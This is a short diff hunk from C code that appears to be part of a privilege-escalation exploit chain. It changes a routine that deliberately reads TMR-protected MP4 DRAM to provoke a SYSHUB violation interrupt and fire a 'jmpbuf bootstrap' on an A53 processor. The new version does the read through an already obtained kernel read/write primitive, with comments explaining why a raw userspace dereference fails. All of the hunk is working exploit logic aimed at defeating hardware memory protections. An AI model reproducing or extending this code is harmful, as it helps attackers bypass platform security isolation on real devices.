@@ -252,12 +252,17 @@ int prosperous_run(void)
      */
     printf("[*] Triggering SYSHUB violation to fire jmpbuf bootstrap...\n");
     for (int attempt = 0; attempt < 5; attempt++) {
-        /* Read TMR-protected MP4 DRAM to trigger SYSHUB violation (IRQ 33) */
-        volatile uint32_t *mp4_dram = (volatile uint32_t *)(
-            (intptr_t)(ctx.dmap_base + MP4_DRAM_BASE));
-        uint32_t dummy = *mp4_dram;  /* TMR blocks this → SYSHUB violation */
-        (void)dummy;
-        printf("[DIAG] SYSHUB trigger read: 0x%08x (blocked by TMR, expected)\n", dummy);
+        /* Read TMR-protected MP4 DRAM via kernel R/W primitive to trigger
+         * SYSHUB violation (GIC IRQ 33). TMR 20 is active, so the read is
+         * blocked by the SB but generates a violation interrupt to the A53.
+         *
+         * Must use kernel_getint (kernel copyin/copyout), NOT raw pointer
+         * dereference — the DMAP address is a kernel VA, inaccessible from
+         * userspace. A raw dereference causes SIGSEGV (process killed). */
+        intptr_t mp4_dram_kva = (intptr_t)(ctx.dmap_base + MP4_DRAM_BASE);
+        uint32_t dummy = kernel_getint(mp4_dram_kva);
+        printf("[DIAG] SYSHUB trigger read @0x%llx: 0x%08x (blocked by TMR)\n",
+               (unsigned long long)mp4_dram_kva, dummy);
 
         usleep(500000); /* 500ms for A53 to process the violation */
 
